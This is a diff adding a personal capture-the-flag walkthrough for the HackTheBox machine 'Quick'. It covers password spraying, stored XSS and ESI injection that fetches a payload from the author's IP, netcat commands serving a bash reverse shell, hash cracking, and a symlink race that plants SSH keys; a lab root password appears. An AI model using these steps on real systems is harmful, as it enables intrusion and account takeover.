@@ -1,0 +1,92 @@
+# user:
+  - nmap directory for initial scans
+  - Only SSH and Port 9001 on top 1000 ports found (9001 is a web server)
+  - Website
+    - It's a php site
+    - There's a portal? (portal.quick.htb), can't seem to connect yet
+    - There's a login page, no way to create an account
+    - Gobuster to find pages
+  - Pages
+    - index.php
+      - Seems generic, no way of input?
+    - search.php
+      - Empty
+    - home.php
+      - Requires login
+    - login.php
+      - Generic login, no way to create an account
+      - Doesn't seem vulnerable to a SQLi (at least sqlmap didn't find anything, but don't rule that out yet)
+    - clients.php
+      - Seems like a table that's populated by a db
+      - I found later (once I had a shell) that it's not, it's static
+    - db.php
+      - Empty page
+    - ticket.php
+      - Requires login
+    - server-status
+      - We can actually view it this time lol
+      - Shows requests being redirected to "127.0.1.1:80", reverse proxy?
+  - Looks like we need to log in somehow
+  - portal.quick.htb leads to a server error. Probably only open on the localhost, which might require an SSH tunnel later (maybe for root?)
+  - I reached out to a fellow htb member and they told me to lookup 'quiche github', so I did that and I was able to connect to the portal!
+    - I asked how they knew to use that and they said a lot of enum based on name of the box and they "heard the chatter"
+  - Using rust quiche client to connect to portal
+    - `cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify https://portal.quick.htb/`
+    - Found list of emails (/index.php?view=about) - emails.txt
+    - Found a password in Connectivity.pdf
+  - Creds don't work on login page or SSH, in the pdf it says to connect to ' http://172.15.0.4/quick_login.jsp'
+  - Put together a list of potential emails and usernames based off the 'testimonials' section of the landing page and the 'clients.php' to get their country (found in portal/emails.txt)
+    - Wrote a script to try all of these emails with the password found in the PDF (brute\_emails.sh)
+    - Found creds for elisa@wink.co.uk
+  - Ticketing System
+    - Still can't see db.php
+    - home.php: can query tickets
+      - Input a number -> "Please provide a search item"
+      - Input a random string -> "0 results"
+      - Basic SQLi doesn't work 
+      - Sends an XMLHttpRequest to 'search.php?search=*query*'
+    - ticket.php is a way to submit a query, looks like it stores it in a DB
+      - Submit just a test ticket -> "TKT-6734 raised. We will answer you as soon as possible"
+      - Can now query that ticket based on ticket number
+      - Vulnerable to a stored XSS (send HTML and it gets rendered onto the page)
+      - It comments out PHP code :/
+      - We can execute JS with `<iframe src="javascript:alert(`xss`)">`
+  - Found [this](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) article previously, but didn't know what to do with it
+    - I found this because I noticed the 'X-Powered-By: Esigate' header and did some googling 
+    - Since I have something that will get rendered on the page, this is much more useful now
+    - Created www/payload.xsl to execute functions based on that article
+  - Steps to reproduce:
+    - Submit a ticket with 'www/inject.xml' as the body
+    - Navigate to '/search.php?search=TKT-*given_ticket*'
+    - This will make a request back to our system
+    - Because python's SimpleHTTPServer was being difficult, I made a valid response file that netcat will serve back whenever we the search page makes a request to us
+      - I hosted the file with SimpleHTTPServer locally and created responses with 'curl -i http://10.10.14.128:8000/payload.xsl > something.req'
+      - 'grab\_script.req' will save the script locally to their machine
+      - 'run\_script.req' will run the script and give us a reverse shell
+    - `nc -nlvvp 8000 < grab_script.req` and then refresh the search page to upload the bash rev shell
+    - Setup a new listener on port 4444 with netcat to catch the reverse shell
+    - `nc -nlvvp 8000 < run_script.req` and then refresh the search page to catch the rev shell
+  - Add your SSH keys to sam's authorized keys
+  - user pwned
+
+# root
+  - Found the mysql password in /var/www/html/db.php
+  - Logged in and found a hash for the passwords of users
+  - Hashes are `md5(crypt($password, 'fa'))`
+  - Wrote a script to crack it manually (in PHP), since it's double-hashed and has a specific salt (crack/crack.php)
+    - Found the password!
+  - Can't login anywhere (although it works for the ticketing system)
+  - Notice in the /var/www/ there's also a 'jobs' and 'printer' directory
+  - Look into the apache config files to see where the 'printer' website is running, since it also accesses that database for logging in and we have a new password :)
+  - LocalForward port 80 on their box to 1337 locally and login to the printer site by adding 'printerv2.quick.htb' to the entry in /etc/hosts for '127.0.0.1'
+  - Can connect to a printer (just host NC on port 9100) and give it your IP address
+  - Looking at the source, we know we're running as srvadm (from apache config files)
+  - And there's a race condition (in job.php) where you can use 'tmp/payload' in the 'jobs' directory to create a sym link to srvadm's authorized keys
+  - The description you give it for the job will be written to that file (so you can write your public key to srvadm's authorized keys)
+  - You gotta be *quick* though, because the filename in the 'jobs' directory is based on the time
+  - Now SSH in as srvadm
+  - Do a lot of digging through files, enum scripts and found some config in home directory
+  - Found this in '.cache/conf.d/printers.conf': 'https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer'
+  - URL decode the password "%26 -> &, %3F -> ?" (root\_pw)
+  - SSH in as root
+  - root pwned
